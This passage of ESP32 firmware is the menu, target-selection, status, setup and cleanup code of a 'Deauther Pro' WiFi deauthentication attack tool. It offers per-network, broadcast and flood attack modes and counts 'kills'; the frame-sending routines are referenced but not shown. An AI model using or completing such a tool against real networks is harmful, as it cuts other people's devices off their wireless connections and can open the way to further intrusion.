    if(isDebouncedPress(BTN_DOWN)) {
        deauth_cursor = (deauth_cursor + 1) % count;
    }
    if(isDebouncedPress(BTN_SELECT)) {
        if(deauth_cursor == count - 1) {
            backDeauthScreen();
        } else {
            showPopupMessage("Read-only", "", "");
            delay(800);
        }
    }
    if(isDebouncedPress(BTN_BACK)) {
        backDeauthScreen();
    }
}

// =================================================
// SCREEN: Main
// =================================================

void screenDeauthMain() {
    const char* items[] = {
        "Scan WiFi",
        "Select Target",
        "Start Attack",
        "Stop Attack",
        "Attack Mode",
        "Status",
        "Settings",
        "Back"
    };
    int count = 8;

    drawDeauthMenu("ESP32 Deauther Pro", items, count);

    if(isDebouncedPress(BTN_UP)) {
        deauth_cursor = (deauth_cursor - 1 + count) % count;
        lastScreenUpdate = 0;
    }
    if(isDebouncedPress(BTN_DOWN)) {
        deauth_cursor = (deauth_cursor + 1) % count;
        lastScreenUpdate = 0;
    }
    if(isDebouncedPress(BTN_SELECT)) {
        if(deauth_cursor == 0) {
            scanDeauthNetworks();
        }
        else if(deauth_cursor == 1) {
            if(ap_count > 0) {
                goDeauthScreen(DEAUTH_WIFI_LIST);
            } else {
                showPopupMessage("Scan first!", "", "");
                delay(1000);
            }
        }
        else if(deauth_cursor == 2) {
            if(ap_count > 0 && deauthSelectedNetwork < ap_count) {
                goDeauthScreen(DEAUTH_DEAUTH);
            } else {
                showPopupMessage("Select target!", "", "");
                delay(1000);
            }
        }
        else if(deauth_cursor == 3) {
            if(deauth_active) {
                stopDeauth();
            } else {
                showPopupMessage("Not running!", "", "");
                delay(800);
            }
        }
        else if(deauth_cursor == 4) {
            goDeauthScreen(DEAUTH_MODE_SELECT);
        }
        else if(deauth_cursor == 5) {
            goDeauthScreen(DEAUTH_STATUS);
        }
        else if(deauth_cursor == 6) {
            goDeauthScreen(DEAUTH_SETTINGS);
        }
        else if(deauth_cursor == 7) {
            deauthExiting = true;
        }
    }
    if(isDebouncedPress(BTN_BACK)) {
        deauthExiting = true;
    }
}

// =================================================
// SCREEN: WiFi List
// =================================================

void screenDeauthWifiList() {
    if(ap_count == 0) {
        u8g2.clearBuffer();
        u8g2.setDrawColor(0);
        u8g2.drawBox(0, 0, 128, 64);
        u8g2.setDrawColor(1);
        u8g2.setFont(u8g2_font_6x10_tr);
        CenteredStr(25, "No networks found");
        CenteredStr(40, "Press BACK");
        u8g2.sendBuffer();
        if(isDebouncedPress(BTN_BACK)) backDeauthScreen();
        return;
    }
    
    String displayItems[DEAUTHER_MAX_NETWORKS];
    for(int i = 0; i < ap_count; i++) {
        String text = deauthSSID[i];
        if(text.length() > 12) text = text.substring(0, 10) + "..";
        text += " " + String(deauthRSSI[i]) + "dB";
        int bars = map(abs(deauthRSSI[i]), 0, 100, 1, 4);
        for(int b = 0; b < bars; b++) text += "█";
        displayItems[i] = text;
    }
    
    const char* items[DEAUTHER_MAX_NETWORKS];
    for(int i = 0; i < ap_count; i++) {
        items[i] = displayItems[i].c_str();
    }
    
    u8g2.clearBuffer();
    u8g2.setDrawColor(0);
    u8g2.drawBox(0, 0, 128, 64);
    u8g2.setDrawColor(1);
    
    u8g2.setFont(u8g2_font_6x10_tf);
    u8g2.drawBox(0, 0, 128, 12);
    u8g2.setDrawColor(0);
    u8g2.drawXBMP(2, 1, 10, 10, icon_wifi);
    u8g2.drawStr(15, 9, "Select Target");
    u8g2.setDrawColor(1);
    u8g2.drawLine(0, 12, 128, 12);
    
    if(deauthSelectedNetwork < deauth_scrollTop) deauth_scrollTop = deauthSelectedNetwork;
    if(deauthSelectedNetwork >= deauth_scrollTop + DEAUTH_VISIBLE_ITEMS) {
        deauth_scrollTop = deauthSelectedNetwork - DEAUTH_VISIBLE_ITEMS + 1;
    }
    
    for(int i = 0; i < DEAUTH_VISIBLE_ITEMS; i++) {
        int itemIndex = deauth_scrollTop + i;
        if(itemIndex >= ap_count) break;
        int y = 16 + i * 9;
        
        u8g2.setDrawColor(0);
        u8g2.drawBox(0, y - 1, 128, 10);
        u8g2.setDrawColor(1);
        
        if(itemIndex == deauthSelectedNetwork) {
            u8g2.setDrawColor(0);
            u8g2.drawBox(0, y - 1, 128, 10);
            u8g2.setDrawColor(1);
            u8g2.setCursor(3, y + 1);
            u8g2.print(">");
            u8g2.setCursor(12, y + 1);
            u8g2.print(items[itemIndex]);
        } else {
            u8g2.setCursor(3, y + 1);
            u8g2.print(" ");
            u8g2.setCursor(12, y + 1);
            u8g2.print(items[itemIndex]);
        }
    }
    
    u8g2.setDrawColor(0);
    u8g2.drawBox(0, 58, 128, 6);
    u8g2.setDrawColor(1);
    u8g2.setCursor(0, 63);
    u8g2.print((deauthSelectedNetwork + 1));
    u8g2.print("/");
    u8g2.print(ap_count);
    
    if(deauthSelectedNetwork < ap_count) {
        u8g2.setCursor(40, 63);
        u8g2.print("CH");
        u8g2.print(deauthChannels[deauthSelectedNetwork]);
        u8g2.setCursor(80, 63);
        u8g2.print(deauthRSSI[deauthSelectedNetwork]);
        u8g2.print("dB");
    }
    
    u8g2.sendBuffer();
    
    if(isDebouncedPress(BTN_UP)) {
        deauthSelectedNetwork = (deauthSelectedNetwork - 1 + ap_count) % ap_count;
        lastScreenUpdate = 0;
    }
    if(isDebouncedPress(BTN_DOWN)) {
        deauthSelectedNetwork = (deauthSelectedNetwork + 1) % ap_count;
        lastScreenUpdate = 0;
    }
    if(isDebouncedPress(BTN_SELECT)) {
        goDeauthScreen(DEAUTH_DEAUTH);
    }
    if(isDebouncedPress(BTN_BACK)) {
        backDeauthScreen();
    }
}

// =================================================
// SCREEN: Status
// =================================================

void screenDeauthStatus() {
    u8g2.clearBuffer();
    u8g2.setDrawColor(0);
    u8g2.drawBox(0, 0, 128, 64);
    u8g2.setDrawColor(1);
    
    u8g2.setFont(u8g2_font_6x10_tf);
    u8g2.drawBox(0, 0, 128, 12);
    u8g2.setDrawColor(0);
    u8g2.drawXBMP(2, 1, 10, 10, icon_wifi);
    u8g2.drawStr(15, 9, "Deauth Status");
    u8g2.setDrawColor(1);
    u8g2.drawLine(0, 12, 128, 12);
    
    u8g2.setCursor(2, 22);
    u8g2.print(deauth_active ? "🔴 ACTIVE" : "⚪ INACTIVE");
    
    u8g2.setCursor(2, 34);
    if(deauth_type == 0 && deauthSelectedNetwork < ap_count) {
        u8g2.print("T: ");
        String target = deauthSSID[deauthSelectedNetwork];
        if(target.length() > 10) target = target.substring(0, 8) + "..";
        u8g2.print(target);
    } else if(deauth_type == 1) {
        u8g2.print("T: ALL (Broadcast)");
    } else if(deauth_type == 2) {
        u8g2.print("T: ALL (Flood)");
    } else {
        u8g2.print("T: None");
    }
    
    u8g2.setCursor(2, 46);
    u8g2.print("Kill: ");
    u8g2.print(deauth_eliminated);
    
    u8g2.setCursor(2, 58);
    u8g2.print("Mode: ");
    switch(currentAttackMode) {
        case ATTACK_MODE_NORMAL: u8g2.print("Normal"); break;
        case ATTACK_MODE_BROADCAST: u8g2.print("Broadcast"); break;
        case ATTACK_MODE_FLOOD: u8g2.print("Flood"); break;
        default: u8g2.print("Normal");
    }
    u8g2.print(" R:");
    u8g2.print(reasonCodes[currentReasonIdx]);
    
    if (autoCycleRunning && deauth_active) {
        u8g2.setCursor(2, 63);
        u8g2.print("🔄 Cycling...");
    }
    
    u8g2.sendBuffer();
    
    if(isDebouncedPress(BTN_BACK)) {
        if(deauth_active) {
            stopDeauth();
        }
        goDeauthScreen(DEAUTH_MAIN);
    }
}

// =================================================
// SETUP
// =================================================

void deautherSetup() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    deauth_currentScreen = DEAUTH_MAIN;
    deauth_lastScreen = DEAUTH_MAIN;
    deauth_cursor = 0;
    deauth_scrollTop = 0;
    deauth_active = false;
    deauthExiting = false;
    deauth_processing = false;
    lastButtonPressTime = 0;
    lastScreenUpdate = 0;
    currentAttackMode = ATTACK_MODE_NORMAL;
    currentReasonIdx = 0;
    autoCycleRunning = false;
    deauth_task_running = false;
    deauth_stop_requested = false;
    deauth_packets_sent = 0;
    clearPopup();
    
    scanDeauthNetworks();
    
    u8g2.clearBuffer();
    u8g2.setDrawColor(0);
    u8g2.drawBox(0, 0, 128, 64);
    u8g2.setDrawColor(1);
    
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawXBMP(56, 5, 16, 16, icon_wifi);
    CenteredStr(20, "ESP32 Deauther Pro");
    
    char countStr[20];
    sprintf(countStr, "Networks: %d", ap_count);
    CenteredStr(35, countStr);
    CenteredStr(48, "SELECT: Menu");
    CenteredStr(60, "BACK: Exit");
    
    u8g2.sendBuffer();
    delay(1000);
    
    Serial.println("✅ Deauther Pro initialized");
    Serial.printf("📡 APs found: %d\n", ap_count);
}

// =================================================
// LOOP
// =================================================

void deautherLoop() {
    if (deauthExiting) {
        deautherCleanup();
        return;
    }
    
    if (drawPopupIfActive()) {
        delay(50);
        return;
    }
    
    if (deauth_active && deauth_type == 1) {
        if(deauth_curr_channel > DEAUTHER_CHANNEL_MAX) deauth_curr_channel = 1;
        esp_wifi_set_channel(deauth_curr_channel, WIFI_SECOND_CHAN_NONE);
        deauth_curr_channel++;
        delay(20);
    }
    
    if (millis() - lastScreenUpdate > SCREEN_UPDATE_INTERVAL) {
        switch(deauth_currentScreen) {
            case DEAUTH_MAIN: screenDeauthMain(); break;
            case DEAUTH_WIFI_LIST: screenDeauthWifiList(); break;
            case DEAUTH_DEAUTH: screenDeauthTarget(); break;
            case DEAUTH_STATUS: screenDeauthStatus(); break;
            case DEAUTH_SETTINGS: screenDeauthSettings(); break;
            case DEAUTH_MODE_SELECT: screenAttackMode(); break;
            case DEAUTH_REASON_SELECT: screenReasonSelect(); break;
            default: screenDeauthMain(); break;
        }
        lastScreenUpdate = millis();
    }
    
    delay(10);
}

// =================================================
// CLEANUP
// =================================================

void deautherCleanup() {
    Serial.println("🧹 Deauther cleanup...");
    
    if (deauth_active) {
        stopDeauth();
        delay(100);
    }
    
    deauth_stop_requested = true;
    
    if (deauth_task_handle != NULL) {
        vTaskDelete(deauth_task_handle);
        deauth_task_handle = NULL;
    }
    
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    delay(50);
    Serial.println("  ✅ Promiscuous disabled");
    
    deauth_active = false;
    deauth_task_running = false;
    deauth_isScanning = false;
    autoCycleRunning = false;
    deauth_currentScreen = DEAUTH_MAIN;
    deauth_cursor = 0;
    deauth_scrollTop = 0;
    ap_count = 0;
    deauth_eliminated = 0;
    deauth_curr_channel = 1;
    deauthExiting = false;
    deauth_processing = false;
    currentReasonIdx = 0;
    deauth_packets_sent = 0;
    clearPopup();
    
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(100);
    Serial.println("  ✅ WiFi reset");
    
    u8g2.clearBuffer();
    u8g2.setDrawColor(0);
    u8g2.drawBox(0, 0, 128, 64);
    u8g2.sendBuffer();
    delay(50);
    
    Serial.println("✅ Deauther cleanup complete");
    exitModule();
}